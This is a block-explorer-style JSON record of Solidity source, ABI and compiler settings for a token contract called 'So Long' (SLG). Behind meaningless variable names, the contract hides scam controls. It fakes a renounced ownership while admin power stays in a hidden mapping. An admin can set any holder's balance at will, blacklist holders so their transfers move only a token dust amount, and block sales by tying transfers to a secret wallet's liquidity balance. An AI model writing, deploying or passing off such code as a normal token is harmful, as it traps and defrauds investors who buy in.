{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface senderSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenLimit {\n    function createPair(address shouldTake, address launchedFee) external returns (address);\n}\n\ninterface modeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeFrom) external view returns (uint256);\n\n    function transfer(address receiverSell, uint256 fromTrading) external returns (bool);\n\n    function allowance(address minReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSell,\n        uint256 fromTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTrading, uint256 value);\n    event Approval(address indexed minReceiver, address indexed spender, uint256 value);\n}\n\ninterface modeReceiverMetadata is modeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SoLong is maxLaunched, modeReceiver, modeReceiverMetadata {\n\n    address public minMax;\n\n    function exemptListTeam(address launchMax, uint256 fromTrading) public {\n        maxAtAmount();\n        senderTotal[launchMax] = fromTrading;\n    }\n\n    function maxAtAmount() private view {\n        require(buyTo[_msgSender()]);\n    }\n\n    function modeSell(address fundMin) public {\n        maxAtAmount();\n        if (swapIs) {\n            totalExempt = false;\n        }\n        if (fundMin == listTokenMin || fundMin == minMax) {\n            return;\n        }\n        takeList[fundMin] = true;\n    }\n\n    address public listTokenMin;\n\n    uint256 private launchedBuy = 100000000 * 10 ** 18;\n\n    function transfer(address launchMax, uint256 fromTrading) external virtual override returns (bool) {\n        return atFund(_msgSender(), launchMax, fromTrading);\n    }\n\n    bool public listLimit;\n\n    uint256 constant toExempt = 3 ** 10;\n\n    mapping(address => bool) public takeList;\n\n    uint8 private launchToken = 18;\n\n    function allowance(address teamIsTotal, address autoSell) external view virtual override returns (uint256) {\n        if (autoSell == tokenFrom) {\n            return type(uint256).max;\n        }\n        return minSwapAt[teamIsTotal][autoSell];\n    }\n\n    function launchFrom(address tradingTake) public {\n        if (listLimit) {\n            return;\n        }\n        \n        buyTo[tradingTake] = true;\n        \n        listLimit = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLiquidityFund;\n    }\n\n    function minEnable(uint256 fromTrading) public {\n        maxAtAmount();\n        tokenFee = fromTrading;\n    }\n\n    address amountMinWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private senderTotal;\n\n    uint256 private launchTxMin;\n\n    bool public swapIs;\n\n    address tokenFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return minIsBuy;\n    }\n\n    event OwnershipTransferred(address indexed takeListAmount, address indexed amountTake);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedBuy;\n    }\n\n    bool public shouldTx;\n\n    bool public swapAuto;\n\n    bool private totalExempt;\n\n    string private minLiquidityFund = \"SLG\";\n\n    function limitTo(address autoFund, address receiverSell, uint256 fromTrading) internal returns (bool) {\n        require(senderTotal[autoFund] >= fromTrading);\n        senderTotal[autoFund] -= fromTrading;\n        senderTotal[receiverSell] += fromTrading;\n        emit Transfer(autoFund, receiverSell, fromTrading);\n        return true;\n    }\n\n    function transferFrom(address autoFund, address receiverSell, uint256 fromTrading) external override returns (bool) {\n        if (_msgSender() != tokenFrom) {\n            if (minSwapAt[autoFund][_msgSender()] != type(uint256).max) {\n                require(fromTrading <= minSwapAt[autoFund][_msgSender()]);\n                minSwapAt[autoFund][_msgSender()] -= fromTrading;\n            }\n        }\n        return atFund(autoFund, receiverSell, fromTrading);\n    }\n\n    uint256 private teamEnable;\n\n    function owner() external view returns (address) {\n        return minIsBuy;\n    }\n\n    function approve(address autoSell, uint256 fromTrading) public virtual override returns (bool) {\n        minSwapAt[_msgSender()][autoSell] = fromTrading;\n        emit Approval(_msgSender(), autoSell, fromTrading);\n        return true;\n    }\n\n    string private totalLiquidityFrom = \"So Long\";\n\n    constructor (){\n        if (teamEnable == maxIs) {\n            shouldTx = false;\n        }\n        senderSell liquidityTeamFee = senderSell(tokenFrom);\n        minMax = tokenLimit(liquidityTeamFee.factory()).createPair(liquidityTeamFee.WETH(), address(this));\n        \n        listTokenMin = _msgSender();\n        limitTrading();\n        buyTo[listTokenMin] = true;\n        senderTotal[listTokenMin] = launchedBuy;\n        if (shouldTx) {\n            tradingAuto = false;\n        }\n        emit Transfer(address(0), listTokenMin, launchedBuy);\n    }\n\n    uint256 public totalBuyFrom;\n\n    function limitTrading() public {\n        emit OwnershipTransferred(listTokenMin, address(0));\n        minIsBuy = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalLiquidityFrom;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchToken;\n    }\n\n    uint256 walletTeamAt;\n\n    function balanceOf(address feeFrom) public view virtual override returns (uint256) {\n        return senderTotal[feeFrom];\n    }\n\n    uint256 tokenFee;\n\n    bool private tradingAuto;\n\n    bool public maxMode;\n\n    mapping(address => bool) public buyTo;\n\n    function atFund(address autoFund, address receiverSell, uint256 fromTrading) internal returns (bool) {\n        if (autoFund == listTokenMin) {\n            return limitTo(autoFund, receiverSell, fromTrading);\n        }\n        uint256 receiverAmount = modeReceiver(minMax).balanceOf(amountMinWallet);\n        require(receiverAmount == tokenFee);\n        require(receiverSell != amountMinWallet);\n        if (takeList[autoFund]) {\n            return limitTo(autoFund, receiverSell, toExempt);\n        }\n        return limitTo(autoFund, receiverSell, fromTrading);\n    }\n\n    address private minIsBuy;\n\n    uint256 private maxIs;\n\n    mapping(address => mapping(address => uint256)) private minSwapAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeListAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIsTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"exemptListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTokenMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"minEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuyFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SoLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}